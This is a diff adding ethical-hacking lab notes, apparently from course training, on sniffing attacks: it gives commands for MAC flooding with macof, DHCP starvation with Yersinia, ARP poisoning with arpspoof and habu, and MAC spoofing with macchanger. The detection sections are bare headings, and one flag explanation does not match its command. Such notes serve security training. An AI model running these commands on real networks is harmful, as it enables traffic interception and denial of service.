@@ -1,0 +1,55 @@
+	• Perform active sniffing
+
+	• Perform MAC flooding using macof
+	• Perform a DHCP starvation attack using Yersinia
+	• Perform ARP poisoning using arpspoof
+	• Perform an Man-in-the-Middle (MITM) attack using Cain & Abel
+	• Spoof a MAC address using TMAC and SMAC
+	• Spoof a MAC address of Linux machine using macchanger
+	• Perform network sniffing using various sniffing tools
+
+	• Perform password sniffing using Wireshark
+	• Analyze a network using the Omnipeek Network Protocol Analyzer
+	• Detect network sniffing
+
+	• Detect ARP poisoning and promiscuous mode in a switch-based network
+	• Detect ARP poisoning using the Capsa Network Analyzer
+
+--------------------
+	• Perform MAC Flooding using macof
+
+	• macof -i eth0 -d [Target IP Address]   => -i: specifies the interface and -n: specifies the number of packets to be sent (here, 10).
+
+	• Perform a DHCP Starvation Attack using Yersinia
+	•  yersinia -I and press Enter to open Yersinia in interactive mode.
+	• Select interface 
+	• To remove the Notification window, press any key, and then press h for help.
+	• Press F2 to select DHCP mode. In DHCP mode, STP Fields in the lower section of the window change to DHCP Fields, 
+	• Press x to list available attack options
+	• After a few seconds, press q to stop the attack and terminate Yersinia,
+
+
+	• Perform ARP Poisoning using arpspoof
+	• arpspoof -i eth0 -t 10.10.1.1 10.10.1.11   => -i: specifies network interface and -t: specifies target IP address.
+	• arpspoof -i eth0 -t 10.10.1.11 10.10.1.1 and press Enter.  => the host system informs the target system (10.10.1.11) that it is the access point (10.10.1.1).
+
+
+	•  Perform an Man-in-the-Middle (MITM) Attack using Cain & Abel
+
+
+	• Spoof a MAC Address using TMAC and SMAC
+
+	• Spoof a MAC Address of Linux Machine using macchanger
+	•  ifconfig eth0 down
+	•  macchanger --help 
+	• To see the current MAC address of the Parrot Security machine, type macchanger -s eth0 and press Enter.
+	•  macchanger -a eth0 and press Enter, to set a random vendor MAC address to the network interface.
+	• type macchanger -r eth0 and press Enter, to set a random MAC address to the network interface.
+
+
+
+Detect ARP Poisoning and Promiscuous Mode in a Switch-Based Network
+
+
+ habu.arp.poison 10.10.1.11 10.10.1.13 and press Enter, to start ARP poisoning on Windows 11 machine.
+
